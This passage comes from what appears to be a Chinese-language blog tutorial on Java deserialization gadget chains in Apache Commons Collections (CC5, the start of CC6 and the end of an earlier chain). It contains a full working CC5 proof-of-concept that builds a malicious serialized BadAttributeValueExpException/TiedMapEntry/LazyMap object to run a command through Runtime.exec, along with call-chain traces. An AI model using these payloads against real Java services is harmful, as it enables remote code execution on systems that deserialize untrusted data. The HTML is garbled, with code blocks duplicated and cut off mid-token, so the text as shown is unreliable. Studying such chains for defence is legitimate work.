class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                         <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal"><code class="language-hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                         <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>









<h2 id="0x3-5-Commons-Collections5"><a href="#0x3-5-Commons-Collections5" class="headerlink" title="0x3.5 Commons Collections5"></a>0x3.5 Commons Collections5</h2><p>限制：</p>
<ul>
<li>JDK 1.8</li>
<li>Commons Collections 3.1</li>
</ul>
<p>CC5开始了一个新的触发点，也就是BadAttributeValueExpException，看这个类的readObject方法：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre class=" language-hljs gradle"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> BadAttributeValueExpException <span class="hljs-keyword">extends</span> Exception   &#123;<br><br><br>    <span class="hljs-comment">/* Serial version */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">3105272988410493376</span>L;<br><br>    <span class="hljs-keyword">private</span> Object val;<br><br>    <span class="hljs-keyword">public</span> BadAttributeValueExpException (Object val) &#123;<br>        <span class="hljs-keyword">this</span>.val = val == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">null</span> : val.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> readObject(ObjectInputStream ois) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.GetField gf = ois.readFields();<br>        Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) &#123;<br>            val = <span class="hljs-keyword">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        <br>        <span class="hljs-comment">// 测试时发现 System.getSecurityManager() == null ，不知道为什么，所以可以跳过这个类型检查</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Long</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Float</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Double</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Byte</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Short</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Boolean</span>) &#123;<br>            <span class="hljs-comment">// 利用点在这，能配合TiedMapEntry触发transforme</span><br>            val = valObj.toString();<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string"><code class="language-hljs gradle"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> BadAttributeValueExpException <span class="hljs-keyword">extends</span> Exception   &#123;<br><br><br>    <span class="hljs-comment">/* Serial version */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">3105272988410493376</span>L;<br><br>    <span class="hljs-keyword">private</span> Object val;<br><br>    <span class="hljs-keyword">public</span> BadAttributeValueExpException (Object val) &#123;<br>        <span class="hljs-keyword">this</span>.val = val == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">null</span> : val.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> readObject(ObjectInputStream ois) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.GetField gf = ois.readFields();<br>        Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) &#123;<br>            val = <span class="hljs-keyword">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        <br>        <span class="hljs-comment">// 测试时发现 System.getSecurityManager() == null ，不知道为什么，所以可以跳过这个类型检查</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Long</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Float</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Double</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Byte</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Short</span><br>                || valObj <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">Boolean</span>) &#123;<br>            <span class="hljs-comment">// 利用点在这，能配合TiedMapEntry触发transforme</span><br>            val = valObj.toString();<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">"@"</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br> &#125;<br><br></code></pre></td></tr></table></figure>



<p>POC:</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre class=" language-hljs haxe"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception&#123;<br>        <span class="hljs-keyword">String</span> cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<br>                        <span class="hljs-keyword">String</span>.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<br>                        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;cmd&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">// LazyMap 将chainedTransformer 封装到自己的transofrm方法上来</span><br>        LazyMap lazyMapDecorate = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-comment">// tideMapEntry 的 toString 方法会执行transofrm</span><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> <span class="hljs-type">TiedMapEntry</span>(lazyMapDecorate, <span class="hljs-string">&quot;xxxx&quot;</span>);<br><br>        <span class="hljs-comment">// BadAttributeValueExpException 的readObject会执行toString方法，所以可以触发chainedTransformer</span><br>        BadAttributeValueExpException expException = <span class="hljs-keyword">new</span> <span class="hljs-type">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 利用反射，把这个类的属性设置上，这样序列化后就可以执行</span><br>        Field val = expException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.<span class="hljs-keyword">set</span>(expException, tiedMapEntry);<br><br>        <span class="hljs-comment">// 写文件验证</span><br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        out.writeObject(expException);<br>        ObjectInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">FileInputStream</span>(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        <span class="hljs-keyword"><code class="language-hljs haxe"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception&#123;<br>        <span class="hljs-keyword">String</span> cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<br>                        <span class="hljs-keyword">String</span>.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<br>                        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;cmd&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">// LazyMap 将chainedTransformer 封装到自己的transofrm方法上来</span><br>        LazyMap lazyMapDecorate = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-comment">// tideMapEntry 的 toString 方法会执行transofrm</span><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> <span class="hljs-type">TiedMapEntry</span>(lazyMapDecorate, <span class="hljs-string">&quot;xxxx&quot;</span>);<br><br>        <span class="hljs-comment">// BadAttributeValueExpException 的readObject会执行toString方法，所以可以触发chainedTransformer</span><br>        BadAttributeValueExpException expException = <span class="hljs-keyword">new</span> <span class="hljs-type">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 利用反射，把这个类的属性设置上，这样序列化后就可以执行</span><br>        Field val = expException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.<span class="hljs-keyword">set</span>(expException, tiedMapEntry);<br><br>        <span class="hljs-comment">// 写文件验证</span><br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        out.writeObject(expException);<br>        ObjectInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">FileInputStream</span>(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        <span class="hljs-keyword">in</span>.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>利用链：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre class=" language-hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BadAttributeValueExpException</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal"><code class="language-hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BadAttributeValueExpException</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>



<h2 id="0x3-6-Commons-Collections6"><a href="#0x3-6-Commons-Collections6" class="headerlink" title="0x3.6 Commons Collections6"></a>0x3.6 Commons Collections6</h2><p>限制：</p>
<ul>
<li>JDK 1.8</li>
<li>Commons Collections 3.1</li>
</ul>
<p>CC6 其实也是利用HashMap的readObject中的map.put最终会执行hashCode，所以可配合TiedMapEntry执行Transform。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">     <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>     <span class="hljs-comment">// Consume and ignore stream fields (currently zero).</span><br>     s.readFields();<br>	<br>  		<span class="hljs-comment">// 省略无关代码...</span><br><br><br>     <span class="hljs-comment">// Create backing HashMap</span><br>     map = (((HashSet&lt;?&gt;)<span class="hljs-keyword">this</span>) <span class="hljs-keyword">instanceof</span> LinkedHashSet ?<br>            <span class="hljs-keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :<br>            <span class="hljs-keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));<br><br>     <span class="hljs-comment">// Read in all elements in the proper order.</span><br>     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) &#123;<br>         <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>             E e = (E) s.readObject();<br>       	<span class="hljs-comment">// 利用点在这put时会执行 hashCode方法</span><br>         map.put(e, PRESENT);<br>     &#125;<br> &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>     <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br> &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>     <span class="hljs-keyword">int</span> h;<br>     <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number"><code class="language-hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">     <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>     <span class="hljs-comment">// Consume and ignore stream fields (currently zero).</span><br>     s.readFields();<br>	<br>  		<span class="hljs-comment">// 省略无关代码...</span><br><br><br>     <span class="hljs-comment">// Create backing HashMap</span><br>     map = (((HashSet&lt;?&gt;)<span class="hljs-keyword">this</span>) <span class="hljs-keyword">instanceof</span> LinkedHashSet ?<br>            <span class="hljs-keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :<br>            <span class="hljs-keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));<br><br>     <span class="hljs-comment">// Read in all elements in the proper order.</span><br>     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) &#123;<br>         <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>             E e = (E) s.readObject();<br>       	<span class="hljs-comment">// 利用点在这put时会执行 hashCode方法</span><br>         map.put(e, PRESENT);<br>     &#125;<br> &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>     <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br> &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>     <span class="hljs-keyword">int</span> h;<br>     <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br> &#125;<br></code></pre></td></tr></table></figure>



<p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 